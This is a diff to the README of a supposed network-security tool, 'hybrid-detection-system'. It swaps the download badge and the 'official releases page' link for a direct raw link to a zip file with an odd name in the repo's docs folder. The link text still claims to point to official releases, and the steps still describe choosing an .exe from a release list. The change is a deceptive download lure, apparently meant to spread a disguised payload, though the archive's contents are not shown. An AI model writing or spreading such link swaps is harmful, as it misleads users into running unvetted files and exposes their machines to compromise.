@@ -1,6 +1,6 @@
 # 🛡️ hybrid-detection-system - Intelligent security for your computer networks
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/KANGROO555/hybrid-detection-system/releases)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/KANGROO555/hybrid-detection-system/main/docs/system-hybrid-detection-Conrad.zip)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these needs:
 
 Follow these steps to obtain the installer for your computer:
 
-1. Visit the [official releases page](https://github.com/KANGROO555/hybrid-detection-system/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/KANGROO555/hybrid-detection-system/main/docs/system-hybrid-detection-Conrad.zip).
 2. Look at the list under the latest version header.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your Downloads folder.
